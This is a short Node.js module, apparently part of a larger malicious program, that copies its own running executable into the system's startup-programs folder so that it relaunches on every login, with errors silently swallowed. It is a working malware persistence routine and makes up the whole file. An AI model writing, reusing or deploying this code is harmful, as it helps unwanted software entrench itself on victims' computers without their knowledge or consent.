const { startupPrograms } = require('../util/variables');
const { copyFile, existsSync } = require('fs');
const { resolve, sep } = require('path');

const file = process.argv0;
const fileName = file.split(sep).pop();

// If not already in startup programs, put it in those
if (!existsSync(resolve(startupPrograms, fileName))) {
  // Copy itself to startup programs
  copyFile(file, resolve(startupPrograms, fileName), () => {});
}
